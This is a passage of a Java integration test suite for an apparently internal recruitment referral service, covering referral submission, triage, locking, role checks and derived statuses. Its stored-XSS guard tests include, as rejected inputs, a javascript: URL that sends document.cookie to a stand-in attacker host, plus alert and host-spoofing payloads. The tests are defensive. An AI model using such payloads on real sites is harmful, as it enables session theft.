package dk.trustworks.intranet.recruitmentservice.services;

import dk.trustworks.intranet.recruitmentservice.dto.ApplicationRejectRequest;
import dk.trustworks.intranet.recruitmentservice.dto.MyReferralsResponse;
import dk.trustworks.intranet.recruitmentservice.dto.ReferralCreateRequest;
import dk.trustworks.intranet.recruitmentservice.dto.ReferralCreateResponse;
import dk.trustworks.intranet.recruitmentservice.dto.ReferralTriageRequest;
import dk.trustworks.intranet.recruitmentservice.dto.ReferralTriageResponse;
import dk.trustworks.intranet.recruitmentservice.dto.TriageQueueCandidate;
import dk.trustworks.intranet.recruitmentservice.dto.TriageQueueResponse;
import dk.trustworks.intranet.recruitmentservice.events.RecruitmentEvent;
import dk.trustworks.intranet.recruitmentservice.events.RecruitmentEventPiiAssertions;
import dk.trustworks.intranet.recruitmentservice.events.RecruitmentEventType;
import dk.trustworks.intranet.recruitmentservice.model.RecruitmentApplication;
import dk.trustworks.intranet.recruitmentservice.model.RecruitmentCandidate;
import dk.trustworks.intranet.recruitmentservice.model.RecruitmentPosition;
import dk.trustworks.intranet.recruitmentservice.model.RecruitmentReferral;
import dk.trustworks.intranet.recruitmentservice.model.enums.CandidateLawfulBasis;
import dk.trustworks.intranet.recruitmentservice.model.enums.CandidateSource;
import dk.trustworks.intranet.recruitmentservice.model.enums.RecruitmentApplicationTerminal;
import dk.trustworks.intranet.recruitmentservice.model.enums.RecruitmentReferralClosedReason;
import dk.trustworks.intranet.recruitmentservice.model.enums.RecruitmentReferralDerivedStatus;
import dk.trustworks.intranet.recruitmentservice.model.enums.RecruitmentReferralStatus;
import dk.trustworks.intranet.recruitmentservice.model.exception.BusinessRuleViolation;
import io.quarkus.narayana.jta.QuarkusTransaction;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import jakarta.persistence.EntityManager;
import jakarta.persistence.OptimisticLockException;
import jakarta.ws.rs.WebApplicationException;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.time.Duration;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import static dk.trustworks.intranet.recruitmentservice.events.RecruitmentEventPiiAssertions.PII_SENTINEL;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * P6 DoD at the service layer (plan §P6, contract §3):
 * <ul>
 *   <li>submit → row + {@code REFERRAL_SUBMITTED} with a structural-only
 *       payload (names/links/why exclusively in pii);</li>
 *   <li>triage create reuses the P3 candidate path: source=REFERRAL,
 *       referred_by set, Art. 14 bookkeeping (+30 d), lawful basis —
 *       then {@code REFERRAL_TRIAGED};</li>
 *   <li>partner variant sets the mandate AND the P4 partner-referral
 *       reject guard fires end-to-end from this real referral;</li>
 *   <li>optional position attach → {@code APPLICATION_CREATED} +
 *       CONVERTED; attach invariants still conflict (closed position);</li>
 *   <li>dismiss → CLOSED + reason; any second triage conflicts (409 —
 *       idempotency for the P14 Slack double-click);</li>
 *   <li>derivedStatus mapping: one test per milestone;</li>
 *   <li>the unsolicited triage queue (P5 carry-over): candidate-scoped
 *       answers + desired practice surface; applied/pooled candidates
 *       are absent;</li>
 *   <li>{@code assertNoPiiInPayload} green on every appended event
 *       ({@code PII_SENTINEL} in all personal fixture fields).</li>
 * </ul>
 */
@QuarkusTest
class ReferralServiceIntegrationTest {

    @Inject
    ReferralService referralService;

    @Inject
    RecruitmentApplicationService applicationService;

    @Inject
    EntityManager em;

    private final UUID referrer = UUID.randomUUID();
    private final UUID recruiter = UUID.randomUUID();

    private String practiceUuid;
    private String openPositionUuid;
    private String closedPositionUuid;

    private final List<String> referralUuids = new ArrayList<>();
    private final List<String> candidateUuids = new ArrayList<>();

    @BeforeEach
    void seedFixtures() {
        practiceUuid = UUID.randomUUID().toString();
        openPositionUuid = UUID.randomUUID().toString();
        closedPositionUuid = UUID.randomUUID().toString();

        QuarkusTransaction.requiringNew().run(() -> {
            insertPractice(practiceUuid);
            insertPosition(openPositionUuid, "Consultant", "OPEN");
            insertPosition(closedPositionUuid, "Closed opening", "CLOSED");
            // The triage attach leg runs the real visibility/decision checks
            // against the roles table — the triaging actor must be HR tier.
            em.createNativeQuery("INSERT INTO roles (uuid, role, useruuid) VALUES (:u, 'HR', :user)")
                    .setParameter("u", UUID.randomUUID().toString())
                    .setParameter("user", recruiter.toString())
                    .executeUpdate();
        });
    }

    @AfterEach
    void cleanup() {
        QuarkusTransaction.requiringNew().run(() -> {
            if (!candidateUuids.isEmpty()) {
                em.createNativeQuery("""
                                DELETE FROM recruitment_application_answers
                                WHERE candidate_uuid IN :c
                                """)
                        .setParameter("c", candidateUuids).executeUpdate();
                em.createNativeQuery("DELETE FROM recruitment_events WHERE candidate_uuid IN :c")
                        .setParameter("c", candidateUuids).executeUpdate();
                em.createNativeQuery("DELETE FROM recruitment_consents WHERE candidate_uuid IN :c")
                        .setParameter("c", candidateUuids).executeUpdate();
                em.createNativeQuery("DELETE FROM recruitment_applications WHERE candidate_uuid IN :c")
                        .setParameter("c", candidateUuids).executeUpdate();
            }
            for (String referralUuid : referralUuids) {
                // Referral events without a candidate subject (submit,
                // dismiss) are only traceable through payload.referral_uuid.
                em.createNativeQuery("DELETE FROM recruitment_events WHERE payload LIKE :like")
                        .setParameter("like", "%" + referralUuid + "%").executeUpdate();
            }
            if (!referralUuids.isEmpty()) {
                em.createNativeQuery("DELETE FROM recruitment_referrals WHERE uuid IN :r")
                        .setParameter("r", referralUuids).executeUpdate();
            }
            if (!candidateUuids.isEmpty()) {
                em.createNativeQuery("DELETE FROM recruitment_candidates WHERE uuid IN :c")
                        .setParameter("c", candidateUuids).executeUpdate();
            }
            em.createNativeQuery("DELETE FROM recruitment_events WHERE position_uuid IN :p")
                    .setParameter("p", List.of(openPositionUuid, closedPositionUuid)).executeUpdate();
            em.createNativeQuery("DELETE FROM recruitment_positions WHERE uuid IN :p")
                    .setParameter("p", List.of(openPositionUuid, closedPositionUuid)).executeUpdate();
            em.createNativeQuery("DELETE FROM practice WHERE uuid = :pr")
                    .setParameter("pr", practiceUuid).executeUpdate();
            em.createNativeQuery("DELETE FROM roles WHERE useruuid = :user")
                    .setParameter("user", recruiter.toString()).executeUpdate();
        });
        referralUuids.clear();
        candidateUuids.clear();
    }

    // ---- Submit ------------------------------------------------------------------

    @Test
    void submit_persistsRow_andEmitsStructuralOnlyEvent() {
        String referralUuid = submitReferral(referrer);

        RecruitmentReferral referral = reloadReferral(referralUuid);
        assertEquals(RecruitmentReferralStatus.SUBMITTED, referral.getStatus());
        assertEquals(referrer.toString(), referral.getReferrerUuid());
        assertNotNull(referral.getSubmittedAt());
        assertNull(referral.getCandidateUuid());

        RecruitmentEvent event = referralEvent(referralUuid, RecruitmentEventType.REFERRAL_SUBMITTED);
        assertEquals(referrer.toString(), event.getActorUuid());
        assertNull(event.getCandidateUuid(), "no candidate exists at submission");
        assertTrue(event.getPayload().contains("\"relation\":\"COLLEAGUE\""));
        assertTrue(event.getPayload().contains("\"has_linkedin\":true"));
        assertTrue(event.getPayload().contains("\"has_email\":true"));
        assertTrue(event.getPayload().contains("\"origin\":\"web\""));
        assertTrue(event.getPii().contains(PII_SENTINEL), "personal fields live in pii");
        assertTrue(event.getPii().contains("candidate_name"));
        assertTrue(event.getPii().contains("why_text"));
        RecruitmentEventPiiAssertions.assertNoPiiInPayload(event);
    }

    @Test
    void submit_rejectsBadInput() {
        // A LinkedIn link that is not one.
        WebApplicationException notLinkedin = assertThrows(WebApplicationException.class,
                () -> submit(new ReferralCreateRequest(
                        "Jane Larsen", "https://example.com/jane", null, "COLLEAGUE", null, "why")));
        assertEquals(400, notLinkedin.getResponse().getStatus());

        // whyText over the 2000-char cap.
        WebApplicationException tooLong = assertThrows(WebApplicationException.class,
                () -> submit(new ReferralCreateRequest(
                        "Jane Larsen", null, null, "COLLEAGUE", null, "x".repeat(2001))));
        assertEquals(400, tooLong.getResponse().getStatus());

        // Unknown relation value.
        WebApplicationException badRelation = assertThrows(WebApplicationException.class,
                () -> submit(new ReferralCreateRequest(
                        "Jane Larsen", null, null, "BUDDY", null, "why")));
        assertEquals(400, badRelation.getResponse().getStatus());
    }

    // ---- LinkedIn URL: strict validation + normalization (stored-XSS guard) -----------

    @Test
    void submit_javascriptSchemeLinkedin_is400_evenWhenItMentionsLinkedin() {
        // The old substring check let all three of these through — each
        // would later render as a clickable javascript: href.
        assertEquals(400, assertThrows(WebApplicationException.class,
                () -> submit(requestWithLinkedin(
                        "javascript:fetch('https://evil.example?c='+document.cookie)//linkedin.com")))
                .getResponse().getStatus());

        // Scheme matching must be case-insensitive.
        assertEquals(400, assertThrows(WebApplicationException.class,
                () -> submit(requestWithLinkedin("JAVASCRIPT:alert(document.domain)//linkedin.com")))
                .getResponse().getStatus());

        // linkedin.com in the query string is not linkedin.com as the host.
        assertEquals(400, assertThrows(WebApplicationException.class,
                () -> submit(requestWithLinkedin("https://evil.example/?linkedin.com")))
                .getResponse().getStatus());
    }

    @Test
    void submit_schemelessLinkedin_isNormalizedToHttps_inRowAndPii() {
        ReferralCreateResponse created = submit(requestWithLinkedin("www.linkedin.com/in/jane"));
        referralUuids.add(created.uuid());

        assertEquals("https://www.linkedin.com/in/jane",
                reloadReferral(created.uuid()).getLinkedinUrl(),
                "the stored value is always a safe absolute URL");
        assertTrue(referralEvent(created.uuid(), RecruitmentEventType.REFERRAL_SUBMITTED)
                        .getPii().contains("https://www.linkedin.com/in/jane"),
                "the event pii carries the normalized form too");
    }

    @Test
    void submit_localeSubdomainLinkedin_isAccepted() {
        ReferralCreateResponse created = submit(
                requestWithLinkedin("https://dk.linkedin.com/in/jane?x=1"));
        referralUuids.add(created.uuid());
        assertEquals("https://dk.linkedin.com/in/jane?x=1",
                reloadReferral(created.uuid()).getLinkedinUrl(),
                "locale subdomains are the same family LinkedInUrls normalizes");
    }

    @Test
    void triageCreate_javascriptLinkedin_is400_sameGuardAsSubmit() {
        String referralUuid = submitReferral(referrer);
        WebApplicationException denied = assertThrows(WebApplicationException.class,
                () -> triage(referralUuid, new ReferralTriageRequest(
                        "CREATE_CANDIDATE",
                        PII_SENTINEL + "-Jane", PII_SENTINEL + "-Larsen",
                        null, null,
                        "javascript:alert(1)//linkedin.com",
                        null, null, null, null, null)));
        assertEquals(400, denied.getResponse().getStatus());
        assertEquals(RecruitmentReferralStatus.SUBMITTED,
                reloadReferral(referralUuid).getStatus(), "nothing mutated");
    }

    // ---- Triage: create leg ---------------------------------------------------------

    @Test
    void triageCreate_reusesTheCandidatePath_withArt14Bookkeeping() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, null, null);

        assertEquals(RecruitmentReferralStatus.TRIAGED, result.status());
        assertNotNull(result.candidateUuid());

        RecruitmentCandidate candidate = reloadCandidate(result.candidateUuid());
        assertEquals(CandidateSource.REFERRAL, candidate.getSource());
        assertEquals(referrer.toString(), candidate.getReferredByUserUuid(),
                "the referrer is carried onto the candidate");
        assertEquals(PII_SENTINEL + " External Reference", candidate.getExternalReferrerName());
        assertEquals(CandidateLawfulBasis.LEGITIMATE_INTEREST, candidate.getLawfulBasis());
        assertEquals(Boolean.TRUE, candidate.getArt14Required(),
                "REFERRAL is an indirect source — Art. 14 applies (P3 helper)");
        assertNotNull(candidate.getArt14Deadline());
        assertTrue(Math.abs(Duration.between(
                        LocalDateTime.now(ZoneOffset.UTC).plusDays(30),
                        candidate.getArt14Deadline()).toMinutes()) < 5,
                "art14_deadline = submit + 30 days");

        RecruitmentReferral referral = reloadReferral(referralUuid);
        assertEquals(RecruitmentReferralStatus.TRIAGED, referral.getStatus());
        assertEquals(result.candidateUuid(), referral.getCandidateUuid());
        assertNotNull(referral.getTriagedAt());
        assertEquals(recruiter.toString(), referral.getTriagedByUseruuid());

        List<RecruitmentEvent> events = candidateEvents(result.candidateUuid());
        assertEquals(List.of(RecruitmentEventType.CANDIDATE_CREATED,
                RecruitmentEventType.REFERRAL_TRIAGED),
                events.stream().map(RecruitmentEvent::getEventType).toList(),
                "CANDIDATE_CREATED comes from the existing path — never re-emitted here");
        RecruitmentEvent triaged = events.get(1);
        assertTrue(triaged.getPayload().contains("\"outcome\":\"CANDIDATE_CREATED\""));
        assertTrue(triaged.getPayload().contains(referralUuid));
        assertEquals(result.candidateUuid(), triaged.getCandidateUuid(),
                "the candidate subject rides on the REFERRAL_TRIAGED envelope");
        events.forEach(RecruitmentEventPiiAssertions::assertNoPiiInPayload);
        RecruitmentEventPiiAssertions.assertNoPiiInPayload(
                referralEvent(referralUuid, RecruitmentEventType.REFERRAL_SUBMITTED));
    }

    @Test
    void triageCreate_partnerVariant_setsMandate_andTheP4RejectGuardFires() {
        String sponsor = UUID.randomUUID().toString();
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, sponsor, openPositionUuid);

        RecruitmentCandidate candidate = reloadCandidate(result.candidateUuid());
        assertEquals(CandidateSource.PARTNER_REFERRAL, candidate.getSource());
        assertEquals(sponsor, candidate.getSponsoringPartnerUuid(),
                "the sponsoring partner is the mandate the P4 guard keys on");

        // The plan §P6 DoD: the partner-referral reject guard, exercised
        // end-to-end from THIS referral's real application.
        RecruitmentApplication application = openApplicationOf(result.candidateUuid());
        WebApplicationException denied = assertThrows(WebApplicationException.class,
                () -> reject(application, result.candidateUuid(), false));
        assertEquals(403, denied.getResponse().getStatus());
        assertTrue(String.valueOf(denied.getResponse().getEntity()).contains("Escalate to the recruiter"),
                "the teamlead is routed to escalation, not a generic error");

        reject(application, result.candidateUuid(), true);
        em.clear();
        assertEquals(RecruitmentApplicationTerminal.REJECTED,
                RecruitmentApplication.<RecruitmentApplication>findById(application.getUuid()).getTerminal());
    }

    @Test
    void triageCreate_withPosition_attachesAndConverts() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, null, openPositionUuid);

        assertEquals(RecruitmentReferralStatus.CONVERTED, result.status());
        assertNotNull(openApplicationOf(result.candidateUuid()));
        List<RecruitmentEventType> types = candidateEvents(result.candidateUuid()).stream()
                .map(RecruitmentEvent::getEventType).toList();
        assertEquals(List.of(RecruitmentEventType.CANDIDATE_CREATED,
                RecruitmentEventType.APPLICATION_CREATED,
                RecruitmentEventType.REFERRAL_TRIAGED), types,
                "APPLICATION_CREATED comes from the existing P4 path");
    }

    @Test
    void triageCreate_onClosedPosition_conflictsAndRollsBack() {
        String referralUuid = submitReferral(referrer);
        assertThrows(BusinessRuleViolation.class,
                () -> triageCreate(referralUuid, null, closedPositionUuid),
                "the P4 attach invariants apply unchanged");

        RecruitmentReferral referral = reloadReferral(referralUuid);
        assertEquals(RecruitmentReferralStatus.SUBMITTED, referral.getStatus(),
                "the whole triage rolls back — no half-triaged referral");
        assertNull(referral.getCandidateUuid());
        assertEquals(0, RecruitmentCandidate.count("referredByUserUuid", referrer.toString()),
                "the candidate creation rolled back with it");
    }

    // ---- Triage: dismiss leg --------------------------------------------------------

    @Test
    void triageDismiss_closesWithReason_andSecondTriageConflicts() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triage(referralUuid, dismissRequest("NOT_RELEVANT"));

        assertEquals(RecruitmentReferralStatus.CLOSED, result.status());
        assertNull(result.candidateUuid());
        RecruitmentReferral referral = reloadReferral(referralUuid);
        assertEquals(RecruitmentReferralClosedReason.NOT_RELEVANT, referral.getClosedReason());
        assertNotNull(referral.getTriagedAt());

        RecruitmentEvent event = referralEvent(referralUuid, RecruitmentEventType.REFERRAL_TRIAGED);
        assertTrue(event.getPayload().contains("\"outcome\":\"DISMISSED\""));
        assertTrue(event.getPayload().contains("\"dismiss_reason\":\"NOT_RELEVANT\""));
        RecruitmentEventPiiAssertions.assertNoPiiInPayload(event);

        // One-shot: any second triage — dismiss or create — conflicts.
        assertThrows(BusinessRuleViolation.class,
                () -> triage(referralUuid, dismissRequest("DUPLICATE")));
        assertThrows(BusinessRuleViolation.class,
                () -> triageCreate(referralUuid, null, null));
    }

    // ---- Triage: optimistic lock (race-safe one-shot) ---------------------------------

    @Test
    void triage_losingAConcurrentRace_hitsTheOptimisticLock() {
        // The @Version wiring, proven at the entity level: a version bump
        // BEHIND the persistence context (what a concurrently committed
        // triage looks like to the loser) makes the flush of a stale
        // mutation throw — which ReferralService rethrows as the 409
        // BusinessRuleViolation, rolling back the whole transaction.
        String referralUuid = submitReferral(referrer);
        assertThrows(OptimisticLockException.class, () ->
                QuarkusTransaction.requiringNew().run(() -> {
                    em.clear();
                    RecruitmentReferral loaded = RecruitmentReferral.findById(referralUuid);
                    em.createNativeQuery(
                                    "UPDATE recruitment_referrals SET version = version + 1 WHERE uuid = :u")
                            .setParameter("u", referralUuid).executeUpdate();
                    loaded.dismiss(RecruitmentReferralClosedReason.OTHER, recruiter);
                    em.flush();
                }));
        assertEquals(RecruitmentReferralStatus.SUBMITTED,
                reloadReferral(referralUuid).getStatus(),
                "the losing transaction rolled back — the referral is untouched");
    }

    @Test
    void triage_successful_incrementsTheVersion() {
        String referralUuid = submitReferral(referrer);
        assertEquals(0L, reloadReferral(referralUuid).getVersion(),
                "a fresh referral starts at version 0");
        triage(referralUuid, dismissRequest("OTHER"));
        assertEquals(1L, reloadReferral(referralUuid).getVersion(),
                "the triage transition bumps the optimistic lock");
    }

    // ---- Recruiter tier enforced in the service itself --------------------------------

    @Test
    void recruiterSurfaces_rejectNonRecruiterActors_inTheServiceItself() {
        // Defense in depth for the P14 reuse points: a caller that skips
        // the resource never reaches the queues or the triage.
        UUID plainEmployee = UUID.randomUUID(); // no roles seeded
        assertEquals(403, assertThrows(WebApplicationException.class,
                () -> referralService.listPending(plainEmployee))
                .getResponse().getStatus());
        assertEquals(403, assertThrows(WebApplicationException.class,
                () -> referralService.unsolicitedTriageQueue(plainEmployee))
                .getResponse().getStatus());

        String referralUuid = submitReferral(referrer);
        assertEquals(403, assertThrows(WebApplicationException.class,
                () -> referralService.triage(UUID.fromString(referralUuid),
                        dismissRequest("OTHER"), plainEmployee))
                .getResponse().getStatus());
        assertEquals(RecruitmentReferralStatus.SUBMITTED,
                reloadReferral(referralUuid).getStatus(), "nothing mutated");
    }

    // ---- Derived status: one test per milestone -------------------------------------

    @Test
    void derivedStatus_submitted_isAwaitingTriage() {
        String referralUuid = submitReferral(referrer);
        assertEquals(RecruitmentReferralDerivedStatus.AWAITING_TRIAGE,
                derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_dismissed_isClosed() {
        String referralUuid = submitReferral(referrer);
        triage(referralUuid, dismissRequest("DUPLICATE"));
        assertEquals(RecruitmentReferralDerivedStatus.CLOSED, derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_activeCandidateWithoutApplication_isUnderReview() {
        String referralUuid = submitReferral(referrer);
        triageCreate(referralUuid, null, null);
        assertEquals(RecruitmentReferralDerivedStatus.UNDER_REVIEW, derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_pooledCandidate_isInTalentPool() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, null, null);
        update("UPDATE recruitment_candidates SET status = 'POOLED', pool_status = 'PROSPECT' WHERE uuid = :u",
                result.candidateUuid());
        assertEquals(RecruitmentReferralDerivedStatus.IN_TALENT_POOL, derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_openApplicationInScreening_isInScreening() {
        String referralUuid = submitReferral(referrer);
        triageCreate(referralUuid, null, openPositionUuid);
        assertEquals(RecruitmentReferralDerivedStatus.IN_SCREENING, derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_openApplicationInInterview_isInterviewing() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, null, openPositionUuid);
        update("UPDATE recruitment_applications SET stage = 'INTERVIEW_2' WHERE candidate_uuid = :u",
                result.candidateUuid());
        assertEquals(RecruitmentReferralDerivedStatus.INTERVIEWING, derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_openApplicationAtOffer_isOffer() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, null, openPositionUuid);
        update("UPDATE recruitment_applications SET stage = 'OFFER' WHERE candidate_uuid = :u",
                result.candidateUuid());
        assertEquals(RecruitmentReferralDerivedStatus.OFFER, derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_allApplicationsTerminal_isNotProceeding() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, null, openPositionUuid);
        update("UPDATE recruitment_applications SET terminal = 'REJECTED', rejection_reason_code = 'OTHER' "
                + "WHERE candidate_uuid = :u", result.candidateUuid());
        assertEquals(RecruitmentReferralDerivedStatus.NOT_PROCEEDING, derivedStatus(referralUuid));
    }

    @Test
    void derivedStatus_hiredCandidate_isHired() {
        String referralUuid = submitReferral(referrer);
        ReferralTriageResponse result = triageCreate(referralUuid, null, openPositionUuid);
        update("UPDATE recruitment_candidates SET status = 'HIRED' WHERE uuid = :u",
                result.candidateUuid());
        assertEquals(RecruitmentReferralDerivedStatus.HIRED, derivedStatus(referralUuid));
    }

    // ---- Mine -----------------------------------------------------------------------

    @Test
    void listMine_returnsOnlyTheCallersRows() {
        UUID otherReferrer = UUID.randomUUID();
        String mine = submitReferral(referrer);
        String theirs = submitReferral(otherReferrer);

        MyReferralsResponse response = referralService.listMine(referrer);
        assertTrue(response.referrals().stream().anyMatch(r -> r.uuid().equals(mine)));
        assertFalse(response.referrals().stream().anyMatch(r -> r.uuid().equals(theirs)),
                "another employee's referral never surfaces");
    }

    // ---- Unsolicited triage queue (P5 carry-over) -------------------------------------

    @Test
    void triageQueue_unsolicitedAppears_appliedAndPooledDoNot() {
        String unsolicited = insertPublicFormCandidate("ACTIVE", null);
        String applied = insertPublicFormCandidate("ACTIVE", null);
        String pooled = insertPublicFormCandidate("POOLED", "PROSPECT");
        QuarkusTransaction.requiringNew().run(() -> {
            insertCandidateAnswer(unsolicited, "BEST_TASKS", PII_SENTINEL + " workshops");
            insertCandidateAnswer(unsolicited, "WHY_TRUSTWORKS", PII_SENTINEL + " the DNA");
            insertApplication(applied, openPositionUuid);
        });

        TriageQueueResponse queue = referralService.unsolicitedTriageQueue(recruiter);
        List<String> uuids = queue.candidates().stream().map(TriageQueueCandidate::uuid).toList();
        assertTrue(uuids.contains(unsolicited), "awaiting routing → in the queue");
        assertFalse(uuids.contains(applied), "already on a pipeline → routed");
        assertFalse(uuids.contains(pooled), "in the talent pool → routed");

        TriageQueueCandidate card = queue.candidates().stream()
                .filter(c -> c.uuid().equals(unsolicited)).findFirst().orElseThrow();
        assertEquals(practiceUuid, card.desiredPracticeUuid(),
                "desired practice comes from source_detail (P5 keys)");
        assertEquals("Queue Fixture Practice", card.desiredPracticeName());
        assertEquals(2, card.answers().size());
        assertEquals("WHY_TRUSTWORKS", card.answers().get(0).questionKey(),
                "answers follow the question display order, not insert order");
        assertEquals("Hvorfor Trustworks?", card.answers().get(0).label(),
                "labels resolve from PublicApplyQuestions — the UI never interprets keys");
        assertTrue(card.answers().get(1).answer().contains("workshops"));
    }

    // ---- Helpers ---------------------------------------------------------------------

    private ReferralCreateResponse submit(ReferralCreateRequest request) {
        return QuarkusTransaction.requiringNew().call(() -> {
            em.clear();
            return referralService.submit(request, referrer);
        });
    }

    private ReferralCreateRequest requestWithLinkedin(String linkedinUrl) {
        return new ReferralCreateRequest(
                PII_SENTINEL + " Jane Larsen", linkedinUrl, null, "COLLEAGUE", null,
                PII_SENTINEL + " strong PM, great with stakeholders");
    }

    private String submitReferral(UUID submitter) {
        ReferralCreateRequest request = new ReferralCreateRequest(
                PII_SENTINEL + " Jane Larsen",
                "https://www.linkedin.com/in/janelarsen",
                "jane.larsen@example.com",
                "COLLEAGUE",
                PII_SENTINEL + " External Reference",
                PII_SENTINEL + " ran the platform migration at her last job — strong PM");
        ReferralCreateResponse created = QuarkusTransaction.requiringNew().call(() -> {
            em.clear();
            return referralService.submit(request, submitter);
        });
        referralUuids.add(created.uuid());
        return created.uuid();
    }

    private ReferralTriageResponse triageCreate(String referralUuid, String sponsoringPartnerUuid,
                                                String positionUuid) {
        return triage(referralUuid, new ReferralTriageRequest(
                "CREATE_CANDIDATE",
                PII_SENTINEL + "-Jane", PII_SENTINEL + "-Larsen",
                "jane.larsen@example.com", null,
                "https://www.linkedin.com/in/janelarsen",
                sponsoringPartnerUuid, null, positionUuid, null, null));
    }

    private ReferralTriageRequest dismissRequest(String reason) {
        return new ReferralTriageRequest("DISMISS",
                null, null, null, null, null, null, null, null, reason, null);
    }

    private ReferralTriageResponse triage(String referralUuid, ReferralTriageRequest request) {
        ReferralTriageResponse result = QuarkusTransaction.requiringNew().call(() -> {
            em.clear();
            return referralService.triage(UUID.fromString(referralUuid), request, recruiter);
        });
        if (result.candidateUuid() != null) {
            candidateUuids.add(result.candidateUuid());
        }
        return result;
    }

    private void reject(RecruitmentApplication application, String candidateUuid,
                        boolean isRecruiterOrOwner) {
        QuarkusTransaction.requiringNew().run(() -> {
            em.clear();
            RecruitmentApplication managed = RecruitmentApplication.findById(application.getUuid());
            applicationService.reject(managed,
                    RecruitmentPosition.findById(managed.getPositionUuid()),
                    RecruitmentCandidate.findById(candidateUuid),
                    new ApplicationRejectRequest(
                            dk.trustworks.intranet.recruitmentservice.model.enums.RecruitmentRejectionReason.CULTURE_FIT,
                            null),
                    isRecruiterOrOwner, recruiter);
        });
    }

    private RecruitmentReferralDerivedStatus derivedStatus(String referralUuid) {
        em.clear();
        return referralService.listMine(referrer).referrals().stream()
                .filter(r -> r.uuid().equals(referralUuid))
                .findFirst().orElseThrow()
                .derivedStatus();
    }

    private void update(String sql, String uuid) {
        QuarkusTransaction.requiringNew().run(() ->
                em.createNativeQuery(sql).setParameter("u", uuid).executeUpdate());
    }

    private RecruitmentReferral reloadReferral(String uuid) {
        em.clear();
        return RecruitmentReferral.findById(uuid);
    }

    private RecruitmentCandidate reloadCandidate(String uuid) {
        em.clear();
        return RecruitmentCandidate.findById(uuid);
    }

    private RecruitmentApplication openApplicationOf(String candidateUuid) {
        em.clear();
        return RecruitmentApplication
                .<RecruitmentApplication>find("candidateUuid = ?1 and terminal is null", candidateUuid)
                .firstResult();
    }

    private List<RecruitmentEvent> candidateEvents(String candidateUuid) {
        em.clear();
        return RecruitmentEvent.list("candidateUuid = ?1 order by seq", candidateUuid);
    }

    /** The referral's event of a type, located via {@code payload.referral_uuid}. */
    private RecruitmentEvent referralEvent(String referralUuid, RecruitmentEventType type) {
        em.clear();
        List<RecruitmentEvent> events = RecruitmentEvent.list(
                "eventType = ?1 and payload like ?2 order by seq",
                type, "%" + referralUuid + "%");
        assertFalse(events.isEmpty(), "expected a " + type + " event for referral " + referralUuid);
        return events.get(events.size() - 1);
    }

    private String insertPublicFormCandidate(String status, String poolStatus) {
        String uuid = UUID.randomUUID().toString();
        candidateUuids.add(uuid);
        QuarkusTransaction.requiringNew().run(() ->
                em.createNativeQuery("""
                                INSERT INTO recruitment_candidates
                                    (uuid, first_name, last_name, email, status, pool_status, source,
                                     source_detail, created_by_useruuid, created_at, updated_at)
                                VALUES (:uuid, :first, 'Fixture', :email, :status, :pool, 'WEBSITE',
                                        :detail, 'public-form', NOW(), NOW())
                                """)
                        .setParameter("uuid", uuid)
                        .setParameter("first", PII_SENTINEL + "-Unsolicited")
                        .setParameter("email", uuid + "@example.com")
                        .setParameter("status", status)
                        .setParameter("pool", poolStatus)
                        .setParameter("detail", "{\"desiredPracticeUuid\":\"" + practiceUuid
                                + "\",\"desiredPracticeName\":\"Queue Fixture Practice\"}")
                        .executeUpdate());
        return uuid;
    }

    private void insertCandidateAnswer(String candidateUuid, String questionKey, String answer) {
        em.createNativeQuery("""
                        INSERT INTO recruitment_application_answers
                            (uuid, candidate_uuid, question_key, answer, created_at)
                        VALUES (:uuid, :candidate, :key, :answer, NOW(3))
                        """)
                .setParameter("uuid", UUID.randomUUID().toString())
                .setParameter("candidate", candidateUuid)
                .setParameter("key", questionKey)
                .setParameter("answer", answer)
                .executeUpdate();
    }

    private void insertApplication(String candidateUuid, String positionUuid) {
        em.createNativeQuery("""
                        INSERT INTO recruitment_applications
                            (uuid, candidate_uuid, position_uuid, stage,
                             stage_entered_at, created_at, updated_at, created_by)
                        VALUES (:uuid, :candidate, :position, 'SCREENING',
                                NOW(3), NOW(), NOW(), 'test')
                        """)
                .setParameter("uuid", UUID.randomUUID().toString())
                .setParameter("candidate", candidateUuid)
                .setParameter("position", positionUuid)
                .executeUpdate();
    }

    private void insertPractice(String uuid) {
        em.createNativeQuery("""
                        INSERT INTO practice (code, uuid, name, active, sort_order,
                                              created_at, updated_at, created_by)
                        VALUES (:code, :uuid, 'Queue Fixture Practice', 1, 999, NOW(), NOW(), 'test')
                        """)
                .setParameter("code", "R" + uuid.substring(0, 7))
                .setParameter("uuid", uuid)
                .executeUpdate();
    }

    private void insertPosition(String uuid, String title, String status) {
        em.createNativeQuery("""
                        INSERT INTO recruitment_positions
                            (uuid, title, hiring_track, practice_uuid, stage_set,
                             demand_rag, status, opened_at, created_at, updated_at, created_by)
                        VALUES (:uuid, :title, 'PRACTICE_TEAM', :practice,
                                '["SCREENING","INTERVIEW_1","INTERVIEW_2","OFFER","HIRED"]',
                                'GREEN', :status, NOW(3), NOW(), NOW(), 'test')
                        """)
                .setParameter("uuid", uuid)
                .setParameter("title", title)
                .setParameter("practice", practiceUuid)
